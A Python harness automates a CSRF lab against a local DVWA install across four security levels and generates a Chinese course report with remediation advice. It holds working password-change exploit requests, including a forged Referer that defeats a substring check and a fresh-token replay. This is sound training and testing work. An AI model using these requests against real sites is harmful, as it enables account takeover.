import json
import os
import re
import subprocess
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path
from urllib.parse import urljoin

import requests


BASE_URL = "http://127.0.0.1/dvwa/"
USERNAME = "admin"
PASSWORD = "password"
MODULE_PATH = "vulnerabilities/csrf/"
SOURCE_ROOT = Path(r"D:\phpStudy\PHPTutorial\WWW\DVWA")
RUN_DIR = Path(__file__).resolve().parents[1]
REQUESTS_DIR = RUN_DIR / "requests"
SCREENSHOTS_DIR = RUN_DIR / "screenshots"
HARNESS_DIR = RUN_DIR / "generated-harnesses"
OPLOG_PATH = RUN_DIR / "operation-log.jsonl"
REPORT_JSON_PATH = RUN_DIR / "report.json"
REPORT_MD_PATH = RUN_DIR / "report.md"
TZ = timezone(timedelta(hours=8))


def now_iso():
    return datetime.now(TZ).isoformat(timespec="seconds")


def rel(path):
    return Path(path).relative_to(RUN_DIR).as_posix()


def strip_tags(html):
    text = re.sub(r"<script.*?</script>", " ", html, flags=re.I | re.S)
    text = re.sub(r"<style.*?</style>", " ", text, flags=re.I | re.S)
    text = re.sub(r"<[^>]+>", " ", text)
    return re.sub(r"\s+", " ", text).strip()


def token_from(html):
    m = re.search(r"name=['\"]user_token['\"][^>]*value=['\"]([^'\"]+)['\"]", html, re.I)
    return m.group(1) if m else None


def input_names(html):
    return re.findall(r"<input[^>]+name=['\"]?([^'\"\s>]+)", html, flags=re.I)


def pre_markers(html):
    return [re.sub(r"\s+", " ", x).strip() for x in re.findall(r"<pre>(.*?)</pre>", html, flags=re.I | re.S)]


def login_marker(html):
    m = re.search(r"<h3 class=\"(loginSuccess|loginFail)\">(.*?)</h3>", html, re.I | re.S)
    if not m:
        return ""
    return strip_tags(m.group(0))


class Harness:
    def __init__(self):
        self.session = requests.Session()
        self.start = time.perf_counter()
        self.start_ts = now_iso()
        self.request_counter = 0
        self.logs = []
        self.results = []
        self.source_reviews = {}
        self.screenshot_status = {
            "attempted": False,
            "command": None,
            "returncode": None,
            "stdout": "",
            "stderr": "",
            "files": [],
            "note": "",
        }

    def elapsed(self):
        return round(time.perf_counter() - self.start, 3)

    def log(self, difficulty, tool, action, input_summary="", output_summary="", evidence_path=None, duration_s=None):
        entry = {
            "ts": now_iso(),
            "elapsed_s": self.elapsed(),
            "difficulty": difficulty,
            "tool": tool,
            "action": action,
            "input": input_summary,
            "output": output_summary,
            "evidence": rel(evidence_path) if evidence_path else None,
            "duration_s": duration_s,
        }
        self.logs.append(entry)
        with OPLOG_PATH.open("a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def request(self, difficulty, label, method, path, **kwargs):
        t0 = time.perf_counter()
        url = urljoin(BASE_URL, path)
        resp = self.session.request(method, url, timeout=15, allow_redirects=True, **kwargs)
        dt = round(time.perf_counter() - t0, 3)
        self.request_counter += 1
        markers = pre_markers(resp.text)
        login = login_marker(resp.text)
        if login:
            markers.append(login)
        text = strip_tags(resp.text)
        snippet = text[:600]
        req = resp.request
        headers = {k: v for k, v in req.headers.items() if k.lower() not in {"cookie", "authorization"}}
        record = {
            "difficulty": difficulty,
            "label": label,
            "method": method,
            "url": url,
            "final_url": resp.url,
            "status_code": resp.status_code,
            "request_headers": headers,
            "params": kwargs.get("params"),
            "data": kwargs.get("data"),
            "json": kwargs.get("json"),
            "response_length": len(resp.text),
            "response_markers": markers,
            "response_snippet": snippet,
            "duration_s": dt,
        }
        out = REQUESTS_DIR / f"{difficulty}-{self.request_counter:03d}-{label}.json"
        out.write_text(json.dumps(record, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log(difficulty, "Python/requests", f"{method} {path} ({label})",
                 f"params/data/json captured; redirects followed", f"status={resp.status_code}; markers={markers[:3]}",
                 out, dt)
        return resp, record

    def login(self):
        r, _ = self.request("setup", "get-login", "GET", "login.php")
        token = token_from(r.text)
        data = {"username": USERNAME, "password": PASSWORD, "Login": "Login"}
        if token:
            data["user_token"] = token
        r, _ = self.request("setup", "post-login", "POST", "login.php", data=data)
        ok = "Logout" in r.text or "Welcome" in r.text or "Vulnerability" in r.text
        self.log("setup", "auth", "login", "admin with login user_token", f"authenticated={ok}")
        if not ok:
            raise RuntimeError("DVWA login failed; report cannot continue")

    def set_security(self, level):
        r, _ = self.request(level, "get-security", "GET", "security.php")
        token = token_from(r.text)
        data = {"security": level, "seclev_submit": "Submit", "user_token": token}
        self.request(level, "post-security", "POST", "security.php", data=data)
        r, _ = self.request(level, "verify-security", "GET", "security.php")
        ok = f"Security level is currently: {level}" in strip_tags(r.text)
        self.log(level, "security.php", "set security level", f"security={level}", f"verified={ok}")
        if not ok:
            raise RuntimeError(f"failed to set security level {level}")

    def review_source(self, level):
        path = SOURCE_ROOT / "vulnerabilities" / "csrf" / "source" / f"{level}.php"
        lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
        interesting = []
        terms = [
            "isset", "HTTP_REFERER", "checkToken", "password_current", "password_new",
            "password_conf", "Password Changed", "Request Failed", "generateSessionToken",
            "CONTENT_TYPE", "HTTP_USER_TOKEN", "prepare",
        ]
        for i, line in enumerate(lines, start=1):
            if any(t in line for t in terms):
                interesting.append({"line": i, "code": line.strip()})
        review = {
            "path": str(path),
            "bytes": path.stat().st_size,
            "mtime": datetime.fromtimestamp(path.stat().st_mtime, TZ).isoformat(timespec="seconds"),
            "interesting_lines": interesting,
        }
        self.source_reviews[level] = review
        self.log(level, "source-review", f"read {level}.php", str(path), f"{len(interesting)} relevant lines")
        return review

    def inspect_module(self, level):
        r, record = self.request(level, "inspect-module", "GET", MODULE_PATH)
        fields = input_names(r.text)
        token = token_from(r.text)
        self.log(level, "live-page", "inspect CSRF form", MODULE_PATH,
                 f"fields={fields}; token_present={bool(token)}", REQUESTS_DIR / f"{level}-{self.request_counter:03d}-inspect-module.json")
        return r, fields, token, record

    def test_password(self, level, password, label):
        data = {"username": USERNAME, "password": password, "Login": "Login"}
        r, record = self.request(level, label, "POST", "vulnerabilities/csrf/test_credentials.php", data=data)
        marker = login_marker(r.text)
        valid = "Valid password" in marker
        return valid, marker, record

    def change_get(self, level, label, params, headers=None):
        return self.request(level, label, "GET", MODULE_PATH, params=params, headers=headers or {})

    def restore_basic(self, level, referer=None):
        headers = {"Referer": referer} if referer else None
        params = {"password_new": PASSWORD, "password_conf": PASSWORD, "Change": "Change"}
        r, record = self.change_get(level, "restore-password", params, headers=headers)
        valid, marker, cred_record = self.test_password(level, PASSWORD, "verify-restored-password")
        return {"response_markers": pre_markers(r.text), "credential_marker": marker, "restored": valid,
                "request_file": record, "credential_file": cred_record}

    def fresh_module_token(self, level):
        r, _, token, _ = self.inspect_module(level)
        return token

    def run_low(self):
        level = "low"
        t0 = time.perf_counter()
        self.set_security(level)
        self.review_source(level)
        _, fields, token, inspect_record = self.inspect_module(level)
        before_valid, before_marker, before_record = self.test_password(level, PASSWORD, "baseline-current-password-valid")
        fail_params = {"password_new": "dvwa_low_mismatch_a", "password_conf": "dvwa_low_mismatch_b", "Change": "Change"}
        fail_resp, fail_record = self.change_get(level, "baseline-mismatch", fail_params)
        temp = "dvwa_csrf_tmp_low_20260602"
        proof_params = {"password_new": temp, "password_conf": temp, "Change": "Change"}
        proof_resp, proof_record = self.change_get(level, "csrf-proof-no-token-no-referer", proof_params)
        temp_valid, temp_marker, temp_record = self.test_password(level, temp, "verify-temp-password")
        restore = self.restore_basic(level)
        status = "vulnerable"
        elapsed = round(time.perf_counter() - t0, 3)
        result = {
            "difficulty": level,
            "status": status,
            "weakness": "GET password-change endpoint has no anti-CSRF token, no Referer/Origin check, and no current-password check.",
            "fields": fields,
            "token_present": bool(token),
            "baseline": {"markers": pre_markers(fail_resp.text), "request": rel(REQUESTS_DIR / f"{level}-{self.request_counter-3:03d}-baseline-mismatch.json")},
            "proof": {"params": proof_params, "markers": pre_markers(proof_resp.text), "credential_marker": temp_marker,
                      "password_changed": temp_valid, "request_file": proof_record},
            "restore": restore,
            "request_count": len([l for l in self.logs if l["difficulty"] == level and l["tool"] == "Python/requests"]),
            "elapsed_s": elapsed,
            "stop_reason": "",
        }
        self.results.append(result)

    def run_medium(self):
        level = "medium"
        t0 = time.perf_counter()
        self.set_security(level)
        self.review_source(level)
        _, fields, token, inspect_record = self.inspect_module(level)
        self.test_password(level, PASSWORD, "baseline-current-password-valid")
        temp = "dvwa_csrf_tmp_medium_20260602"
        params = {"password_new": temp, "password_conf": temp, "Change": "Change"}
        no_ref_resp, no_ref_record = self.change_get(level, "probe-no-referer", params)
        external_resp, external_record = self.change_get(level, "probe-external-referer", params, headers={"Referer": "http://attacker.local/csrf.html"})
        weak_ref = "http://127.0.0.1.attacker.local/csrf.html"
        proof_resp, proof_record = self.change_get(level, "csrf-proof-weak-referer-substring", params, headers={"Referer": weak_ref})
        temp_valid, temp_marker, temp_record = self.test_password(level, temp, "verify-temp-password")
        restore = self.restore_basic(level, referer=weak_ref)
        elapsed = round(time.perf_counter() - t0, 3)
        result = {
            "difficulty": level,
            "status": "vulnerable",
            "weakness": "Referer validation only checks whether HTTP_REFERER contains SERVER_NAME as a substring.",
            "fields": fields,
            "token_present": bool(token),
            "baseline": {
                "no_referer_markers": pre_markers(no_ref_resp.text),
                "external_referer_markers": pre_markers(external_resp.text),
            },
            "proof": {"params": params, "referer": weak_ref, "markers": pre_markers(proof_resp.text),
                      "credential_marker": temp_marker, "password_changed": temp_valid, "request_file": proof_record},
            "restore": restore,
            "request_count": len([l for l in self.logs if l["difficulty"] == level and l["tool"] == "Python/requests"]),
            "elapsed_s": elapsed,
            "stop_reason": "",
        }
        self.results.append(result)

    def run_high(self):
        level = "high"
        t0 = time.perf_counter()
        self.set_security(level)
        self.review_source(level)
        _, fields, token, inspect_record = self.inspect_module(level)
        self.test_password(level, PASSWORD, "baseline-current-password-valid")
        temp = "dvwa_csrf_tmp_high_20260602"
        params_no_token = {"password_new": temp, "password_conf": temp, "Change": "Change"}
        missing_resp, missing_record = self.change_get(level, "probe-missing-token", params_no_token)
        wrong = dict(params_no_token)
        wrong["user_token"] = "invalid-token"
        wrong_resp, wrong_record = self.change_get(level, "probe-wrong-token", wrong)
        fresh = self.fresh_module_token(level)
        params = dict(params_no_token)
        params["user_token"] = fresh
        proof_resp, proof_record = self.change_get(level, "token-aware-password-change", params)
        temp_valid, temp_marker, temp_record = self.test_password(level, temp, "verify-temp-password")
        fresh_restore = self.fresh_module_token(level)
        restore_params = {"password_new": PASSWORD, "password_conf": PASSWORD, "Change": "Change", "user_token": fresh_restore}
        restore_resp, restore_record = self.change_get(level, "restore-password", restore_params)
        restored, restored_marker, restored_record = self.test_password(level, PASSWORD, "verify-restored-password")
        elapsed = round(time.perf_counter() - t0, 3)
        result = {
            "difficulty": level,
            "status": "conditionally_exploitable_same_origin_token_required",
            "weakness": "Password change does not require current password, but a fresh anti-CSRF token is required. Blind cross-site CSRF is blocked unless another same-origin issue leaks the token.",
            "fields": fields,
            "token_present": bool(token),
            "baseline": {
                "missing_token_markers": pre_markers(missing_resp.text),
                "wrong_token_markers": pre_markers(wrong_resp.text),
            },
            "proof": {"params": params, "markers": pre_markers(proof_resp.text), "credential_marker": temp_marker,
                      "password_changed": temp_valid, "request_file": proof_record},
            "restore": {"response_markers": pre_markers(restore_resp.text), "credential_marker": restored_marker,
                        "restored": restored, "request_file": restore_record},
            "request_count": len([l for l in self.logs if l["difficulty"] == level and l["tool"] == "Python/requests"]),
            "elapsed_s": elapsed,
            "stop_reason": "常规跨站 CSRF 被 token 阻止；本次继续到 impossible 是为了满足课程报告中 impossible/无解原因记录。",
        }
        self.results.append(result)

    def run_impossible(self):
        level = "impossible"
        t0 = time.perf_counter()
        self.set_security(level)
        self.review_source(level)
        _, fields, token, inspect_record = self.inspect_module(level)
        self.test_password(level, PASSWORD, "baseline-current-password-valid")
        temp = "dvwa_csrf_tmp_impossible_20260602"
        missing_params = {"password_current": PASSWORD, "password_new": temp, "password_conf": temp, "Change": "Change"}
        missing_resp, missing_record = self.change_get(level, "probe-missing-token", missing_params)
        wrong_current_token = self.fresh_module_token(level)
        wrong_current = {"password_current": "wrong-current-password", "password_new": temp,
                         "password_conf": temp, "Change": "Change", "user_token": wrong_current_token}
        wrong_current_resp, wrong_current_record = self.change_get(level, "probe-wrong-current-password", wrong_current)
        fresh = self.fresh_module_token(level)
        legitimate = {"password_current": PASSWORD, "password_new": temp, "password_conf": temp,
                      "Change": "Change", "user_token": fresh}
        legit_resp, legit_record = self.change_get(level, "legitimate-change-with-current-password", legitimate)
        temp_valid, temp_marker, temp_record = self.test_password(level, temp, "verify-temp-password")
        restore_token = self.fresh_module_token(level)
        restore_params = {"password_current": temp, "password_new": PASSWORD, "password_conf": PASSWORD,
                          "Change": "Change", "user_token": restore_token}
        restore_resp, restore_record = self.change_get(level, "restore-password", restore_params)
        restored, restored_marker, restored_record = self.test_password(level, PASSWORD, "verify-restored-password")
        elapsed = round(time.perf_counter() - t0, 3)
        result = {
            "difficulty": level,
            "status": "not_vulnerable",
            "weakness": "No standalone CSRF weakness observed; server requires fresh token and the current password before changing state.",
            "fields": fields,
            "token_present": bool(token),
            "baseline": {
                "missing_token_markers": pre_markers(missing_resp.text),
                "wrong_current_markers": pre_markers(wrong_current_resp.text),
            },
            "proof": {"legitimate_params": legitimate, "markers": pre_markers(legit_resp.text),
                      "credential_marker": temp_marker, "password_changed_when_current_password_known": temp_valid,
                      "request_file": legit_record},
            "restore": {"response_markers": pre_markers(restore_resp.text), "credential_marker": restored_marker,
                        "restored": restored, "request_file": restore_record},
            "request_count": len([l for l in self.logs if l["difficulty"] == level and l["tool"] == "Python/requests"]),
            "elapsed_s": elapsed,
            "stop_reason": "fresh user_token + current password validation blocks CSRF.",
        }
        self.results.append(result)

    def write_screenshot_script(self):
        js = r"""
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

const base = 'http://127.0.0.1/dvwa/';
const outDir = process.argv[2];
const manifest = [];

async function shot(page, difficulty, name) {
  const dir = path.join(outDir, difficulty);
  fs.mkdirSync(dir, { recursive: true });
  const file = path.join(dir, `${name}.png`);
  await page.screenshot({ path: file, fullPage: true });
  manifest.push({ difficulty, name, path: file });
}

async function token(page) {
  return await page.locator('input[name="user_token"]').last().inputValue().catch(() => null);
}

async function login(page) {
  await page.goto(base + 'login.php');
  await page.fill('input[name="username"]', 'admin');
  await page.fill('input[name="password"]', 'password');
  await page.click('input[name="Login"]');
  await page.waitForLoadState('networkidle');
}

async function setSecurity(page, level) {
  await page.goto(base + 'security.php');
  await page.selectOption('select[name="security"]', level);
  await page.click('input[name="seclev_submit"]');
  await page.waitForLoadState('networkidle');
  await shot(page, level, 'security-set');
}

async function testCredential(page, difficulty, password, name) {
  await page.goto(base + 'vulnerabilities/csrf/test_credentials.php');
  await page.fill('input[name="username"]', 'admin');
  await page.fill('input[name="password"]', password);
  await page.click('input[name="Login"]');
  await page.waitForLoadState('networkidle');
  await shot(page, difficulty, name);
}

async function main() {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage({ viewport: { width: 1366, height: 900 } });
  await login(page);

  await setSecurity(page, 'low');
  await page.goto(base + 'vulnerabilities/csrf/');
  await shot(page, 'low', 'module-page');
  await page.goto(base + 'vulnerabilities/csrf/?password_new=shot_low_a&password_conf=shot_low_b&Change=Change');
  await shot(page, 'low', 'baseline-mismatch');
  await page.goto(base + 'vulnerabilities/csrf/?password_new=shot_low_tmp_20260602&password_conf=shot_low_tmp_20260602&Change=Change');
  await shot(page, 'low', 'proof-password-changed');
  await testCredential(page, 'low', 'shot_low_tmp_20260602', 'verify-temp-password');
  await page.goto(base + 'vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change');

  await setSecurity(page, 'medium');
  await page.goto(base + 'vulnerabilities/csrf/');
  await shot(page, 'medium', 'module-page');
  await page.goto(base + 'vulnerabilities/csrf/?password_new=shot_medium_a&password_conf=shot_medium_b&Change=Change');
  await shot(page, 'medium', 'baseline-no-referer');
  await page.goto(base + 'vulnerabilities/csrf/?password_new=shot_medium_tmp_20260602&password_conf=shot_medium_tmp_20260602&Change=Change', { referer: 'http://127.0.0.1.attacker.local/csrf.html' });
  await shot(page, 'medium', 'proof-weak-referer');
  await testCredential(page, 'medium', 'shot_medium_tmp_20260602', 'verify-temp-password');
  await page.goto(base + 'vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change', { referer: 'http://127.0.0.1.attacker.local/csrf.html' });

  await setSecurity(page, 'high');
  await page.goto(base + 'vulnerabilities/csrf/');
  await shot(page, 'high', 'module-page');
  await page.goto(base + 'vulnerabilities/csrf/?password_new=shot_high_tmp_20260602&password_conf=shot_high_tmp_20260602&Change=Change');
  await shot(page, 'high', 'baseline-missing-token');
  await page.goto(base + 'vulnerabilities/csrf/');
  let t = await token(page);
  await page.goto(base + `vulnerabilities/csrf/?password_new=shot_high_tmp_20260602&password_conf=shot_high_tmp_20260602&Change=Change&user_token=${t}`);
  await shot(page, 'high', 'token-aware-change');
  await testCredential(page, 'high', 'shot_high_tmp_20260602', 'verify-temp-password');
  await page.goto(base + 'vulnerabilities/csrf/');
  t = await token(page);
  await page.goto(base + `vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change&user_token=${t}`);

  await setSecurity(page, 'impossible');
  await page.goto(base + 'vulnerabilities/csrf/');
  await shot(page, 'impossible', 'module-page');
  await page.goto(base + 'vulnerabilities/csrf/?password_current=password&password_new=shot_impossible_tmp_20260602&password_conf=shot_impossible_tmp_20260602&Change=Change');
  await shot(page, 'impossible', 'baseline-missing-token');
  await page.goto(base + 'vulnerabilities/csrf/');
  t = await token(page);
  await page.goto(base + `vulnerabilities/csrf/?password_current=wrong-current-password&password_new=shot_impossible_tmp_20260602&password_conf=shot_impossible_tmp_20260602&Change=Change&user_token=${t}`);
  await shot(page, 'impossible', 'wrong-current-password');
  await page.goto(base + 'vulnerabilities/csrf/');
  t = await token(page);
  await page.goto(base + `vulnerabilities/csrf/?password_current=password&password_new=shot_impossible_tmp_20260602&password_conf=shot_impossible_tmp_20260602&Change=Change&user_token=${t}`);
  await shot(page, 'impossible', 'legitimate-change-with-current-password');
  await testCredential(page, 'impossible', 'shot_impossible_tmp_20260602', 'verify-temp-password');
  await page.goto(base + 'vulnerabilities/csrf/');
  t = await token(page);
  await page.goto(base + `vulnerabilities/csrf/?password_current=shot_impossible_tmp_20260602&password_new=password&password_conf=password&Change=Change&user_token=${t}`);
  await testCredential(page, 'impossible', 'password', 'verify-restored-password');

  await browser.close();
  fs.writeFileSync(path.join(outDir, 'screenshots.json'), JSON.stringify(manifest, null, 2), 'utf8');
}

main().catch(err => {
  console.error(err && err.stack ? err.stack : String(err));
  process.exit(1);
});
"""
        path = HARNESS_DIR / "csrf_playwright_screenshots.js"
        path.write_text(js, encoding="utf-8")
        return path

    def capture_screenshots(self):
        script = self.write_screenshot_script()
        cmd = ["npx.cmd", "-y", "-p", "playwright@1.60.0", "node", str(script), str(SCREENSHOTS_DIR)]
        self.screenshot_status["attempted"] = True
        self.screenshot_status["command"] = " ".join(cmd)
        t0 = time.perf_counter()
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180, cwd=str(RUN_DIR))
        self.screenshot_status["returncode"] = proc.returncode
        self.screenshot_status["stdout"] = proc.stdout[-2000:]
        self.screenshot_status["stderr"] = proc.stderr[-2000:]
        duration = round(time.perf_counter() - t0, 3)
        if proc.returncode == 0:
            files = sorted([rel(p) for p in SCREENSHOTS_DIR.rglob("*.png")])
            self.screenshot_status["files"] = files
            self.screenshot_status["note"] = f"captured {len(files)} screenshots"
        else:
            self.screenshot_status["note"] = "Playwright screenshot command failed; see stderr/stdout in report.json"
        self.log("screenshots", "Playwright", "capture authenticated screenshots",
                 self.screenshot_status["command"], self.screenshot_status["note"], duration_s=duration)

    def write_report(self):
        finish_ts = now_iso()
        elapsed_total = self.elapsed()
        data = {
            "target": BASE_URL,
            "module": "CSRF",
            "module_path": MODULE_PATH,
            "source_path": str(SOURCE_ROOT),
            "username": USERNAME,
            "start_time": self.start_ts,
            "finish_time": finish_ts,
            "elapsed_s": elapsed_total,
            "request_count_total": self.request_counter,
            "results": self.results,
            "source_reviews": self.source_reviews,
            "screenshots": self.screenshot_status,
            "operation_log": rel(OPLOG_PATH),
            "report_language": "zh-CN",
            "proxy": "http://127.0.0.1:8080 provided but not used; requests stayed direct to local DVWA.",
        }
        REPORT_JSON_PATH.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
        REPORT_MD_PATH.write_text(self.render_markdown(data), encoding="utf-8")
        self.log("report", "harness", "write report", "", f"{REPORT_MD_PATH}", REPORT_MD_PATH)

    def render_markdown(self, data):
        screenshot_lines = []
        if data["screenshots"]["files"]:
            for p in data["screenshots"]["files"]:
                screenshot_lines.append(f"- `{p}`\n\n  ![]({p})")
        else:
            screenshot_lines.append(
                "- Screenshot not captured: "
                + data["screenshots"]["note"]
                + f". Command: `{data['screenshots']['command']}`. stderr/stdout 已写入 `report.json`。"
            )

        progression_rows = []
        for r in data["results"]:
            progression_rows.append(
                f"| {r['difficulty']} | {r['status']} | {r['weakness']} | {r['request_count']} | {r['elapsed_s']}s | {r.get('stop_reason','')} |"
            )

        source_sections = []
        for level, review in data["source_reviews"].items():
            lines = "\n".join([f"- `{item['line']}`: `{item['code']}`" for item in review["interesting_lines"][:12]])
            source_sections.append(
                f"### {level}\n- 文件: `{review['path']}`\n- 大小/修改时间: `{review['bytes']}` bytes, `{review['mtime']}`\n{lines}"
            )

        evidence_sections = []
        for r in data["results"]:
            proof = r.get("proof", {})
            baseline = r.get("baseline", {})
            restore = r.get("restore", {})
            evidence_sections.append(
                f"### {r['difficulty']}\n"
                f"- 字段: `{r['fields']}`; token_present=`{r['token_present']}`\n"
                f"- 基线: `{json.dumps(baseline, ensure_ascii=False)[:900]}`\n"
                f"- 证明/关键请求: `{json.dumps(proof, ensure_ascii=False)[:1200]}`\n"
                f"- 恢复: `{json.dumps(restore, ensure_ascii=False)[:900]}`"
            )

        timeline = []
        for entry in self.logs:
            timeline.append(
                f"- `{entry['ts']}` +{entry['elapsed_s']}s [{entry['difficulty']}] {entry['tool']}: {entry['action']} -> {entry['output']}"
            )

        request_model = """
- 登录路由: `GET/POST /dvwa/login.php`，登录表单参数为 `username`, `password`, `Login`, `user_token`。
- 安全级别路由: `GET/POST /dvwa/security.php`，切换参数为 `security`, `seclev_submit`, `user_token`。
- CSRF 模块路由: `GET /dvwa/vulnerabilities/csrf/`。
- low/medium/high 密码修改参数: `password_new`, `password_conf`, `Change`，high 另需 `user_token`。
- impossible 密码修改参数: `password_current`, `password_new`, `password_conf`, `Change`, `user_token`。
- 关键 Cookie: `PHPSESSID` 保存登录会话，`security` 控制 DVWA 难度。
- 成功标记: `Password Changed.`；失败标记包括 `Passwords did not match.`, `That request didn't look correct.`, `CSRF token is incorrect`, `Passwords did not match or current password incorrect.`。
"""

        extraction = f"""
## 实验总报告可提取信息

### 实验结论
low 和 medium 可被 CSRF/弱 Referer 校验利用完成 admin 密码变更；high 阻止盲跨站 CSRF，但在同源可读取 fresh `user_token` 的前提下仍可改变密码且不要求当前密码；impossible 要求 fresh `user_token` 和 `password_current`，本次判定为无独立 CSRF 解。

### 各难度漏洞成因
- low: `GET /dvwa/vulnerabilities/csrf/?password_new=...&password_conf=...&Change=Change` 只检查两次新密码一致。
- medium: `stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false` 只做子串检查，`Referer: http://127.0.0.1.attacker.local/csrf.html` 可通过。
- high: `checkToken($token, $_SESSION['session_token'], 'index.php')` 要求 fresh `user_token`，盲 CSRF 失败；若攻击者可同源读取 token，可提交 `user_token` 完成变更。
- impossible: `checkToken(...)` 后还用 PDO 查询校验 `password_current`，没有当前密码无法变更。

### 解题步骤
1. 登录 `http://127.0.0.1/dvwa/login.php`，提交 `admin/password` 和登录页 `user_token`。
2. 逐级 POST `security.php` 设置 `low`, `medium`, `high`, `impossible`。
3. 每级访问 `vulnerabilities/csrf/` 解析字段和 token。
4. 每级发送失败基线，再发送控制临时密码变更请求。
5. 用 `vulnerabilities/csrf/test_credentials.php` 验证临时密码是否生效。
6. 每级结束前恢复 `admin/password` 并再次验证。

### 使用工具与操作
- `PowerShell`: 源码定位、环境检查、启动 harness。
- `Python/requests`: 登录、切换难度、发送基线/证明/恢复请求、保存证据。
- `Node Playwright via npx.cmd`: 自动截图尝试，命令为 `{data['screenshots']['command']}`。

### 核心 payload/测试输入
- low: `password_new=dvwa_csrf_tmp_low_20260602&password_conf=dvwa_csrf_tmp_low_20260602&Change=Change`
- medium: 同上结构，附加 `Referer: http://127.0.0.1.attacker.local/csrf.html`
- high: `password_new=dvwa_csrf_tmp_high_20260602&password_conf=dvwa_csrf_tmp_high_20260602&Change=Change&user_token=<fresh token>`
- impossible 防御验证: `password_current=wrong-current-password&password_new=dvwa_csrf_tmp_impossible_20260602&password_conf=dvwa_csrf_tmp_impossible_20260602&Change=Change&user_token=<fresh token>`
- impossible 合法变更/恢复验证: `password_current=password` 或当前临时密码 + fresh `user_token`

### 关键截图
{chr(10).join('- `' + p + '`' for p in data['screenshots']['files']) if data['screenshots']['files'] else '- 未捕获截图: ' + data['screenshots']['note']}

### 复现步骤总结
在已认证会话中按上面的安全级别逐级操作；low 直接访问变更 URL；medium 使用包含 `127.0.0.1` 的 Referer；high 先读取页面 fresh `user_token` 再提交；impossible 缺少当前密码时观察失败标记。

### impossible/无解原因
`impossible.php` 先执行 token 校验，再校验 `password_current` 是否匹配当前用户哈希；攻击者仅凭受害者会话 Cookie 无法构造有效请求。本次只有在已知当前密码时的合法变更能成功，不能作为 CSRF 漏洞证明。

### 辅助脚本
- `{rel(Path(__file__))}`: 本次生成的 Python/requests harness。
- `{rel(HARNESS_DIR / 'csrf_playwright_screenshots.js')}`: harness 生成的 Playwright 截图脚本。

### 起止时间和耗时
- 开始: `{data['start_time']}`
- 结束: `{data['finish_time']}`
- 总耗时: `{data['elapsed_s']}s`

### 人工验证关注点
确认 `security` cookie 对应当前难度；确认每级结束后 `test_credentials.php` 对 `admin/password` 显示 `Valid password for 'admin'`；确认报告中的请求证据文件未包含敏感会话 Cookie。
"""

        return f"""# DVWA CSRF 全自动测试报告

## Summary
- 目标: `{data['target']}`
- 模块: `CSRF` (`{MODULE_PATH}`)
- 进度: `low -> medium -> high -> impossible`
- 结果: low/medium 可利用；high 阻止盲 CSRF 但存在同源 token 条件路径；impossible 未发现独立 CSRF 漏洞。
- 账号恢复: 每个难度结束后均验证 `admin/password` 可用。

## Scope And Environment
- 授权范围: 本地 DVWA `http://127.0.0.1/dvwa/`
- 源码路径: `{data['source_path']}`
- 输出语言: `zh-CN`
- 代理: `{data['proxy']}`
- 工具: `Python requests`, `PowerShell`, `Node Playwright/npx.cmd`
- 报告目录: `{RUN_DIR}`

## Difficulty Progression
| 难度 | 状态 | 关键弱点/防御 | 请求数 | 耗时 | 停止/继续原因 |
| --- | --- | --- | ---: | ---: | --- |
{chr(10).join(progression_rows)}

## Timeline
{chr(10).join(timeline)}

## Source Review
{chr(10).join(source_sections)}

## Request Model
{request_model}

## Hypotheses And Test Design
- low 假设: 如果没有 token/current-password/Referer 校验，则带相同 `password_new` 和 `password_conf` 的 GET 请求会直接变更密码。
- medium 假设: 无 Referer 或不含 `SERVER_NAME` 的 Referer 失败；包含 `127.0.0.1` 子串的 Referer 可绕过弱校验。
- high 假设: 缺失/错误 token 失败；fresh token 可证明服务端仍未要求当前密码，但常规跨站页面无法读取 token。
- impossible 假设: 缺失 token 或当前密码错误均失败；只有知道当前密码的合法请求能变更，因此不构成 CSRF 解。
- 工具选择: 请求形状明确且需要会话/token/恢复流程，所以使用 Python/requests；截图使用 Playwright；Burp/ZAP 未使用，因为代理证据不是必要条件。

## Execution Evidence
{chr(10).join(evidence_sections)}

## Screenshots
{chr(10).join(screenshot_lines)}

## Timing Summary
- 开始时间: `{data['start_time']}`
- 结束时间: `{data['finish_time']}`
- 总耗时: `{data['elapsed_s']}s`
- HTTP 请求总数: `{data['request_count_total']}`
- 分难度耗时: {', '.join([r['difficulty'] + '=' + str(r['elapsed_s']) + 's' for r in data['results']])}

## Result
- low: `vulnerable`，无 CSRF 防护，密码变更成功并已恢复。
- medium: `vulnerable`，Referer 子串检查可绕过，密码变更成功并已恢复。
- high: `conditionally_exploitable_same_origin_token_required`，缺失/错误 token 失败；fresh token 成功说明不要求当前密码，但盲跨站 CSRF 被 token 阻止。
- impossible: `not_vulnerable`，fresh token 和当前密码共同校验，缺少当前密码时无解。

## Remediation
- 使用 POST 配合服务端生成、一次性或会话绑定的 CSRF token，并在所有状态变更请求中验证。
- 不依赖 Referer 子串作为主要防护；如辅助使用，应做严格 Origin/Referer 解析和白名单匹配。
- 密码变更必须要求当前密码，使用参数化查询和统一失败信息。
- Cookie 设置 `HttpOnly`, `Secure`, `SameSite=Strict/Lax`，并结合重新认证保护敏感操作。

## Reproduction Summary
1. 登录 `http://127.0.0.1/dvwa/login.php`，账号 `admin/password`。
2. 在 `security.php` 逐级设置安全级别。
3. 访问 `vulnerabilities/csrf/` 记录表单字段。
4. low 访问 `?password_new=<tmp>&password_conf=<tmp>&Change=Change`。
5. medium 使用同样参数并发送 `Referer: http://127.0.0.1.attacker.local/csrf.html`。
6. high 先读取 fresh `user_token`，再提交相同参数加 `user_token=<fresh token>`；缺失 token 应失败。
7. impossible 使用 fresh token 但错误 `password_current`，应出现 `Passwords did not match or current password incorrect.`。
8. 每级使用 `test_credentials.php` 验证临时密码和恢复后的 `password`。

## Artifacts
- Markdown 报告: `{rel(REPORT_MD_PATH)}`
- JSON 报告: `{rel(REPORT_JSON_PATH)}`
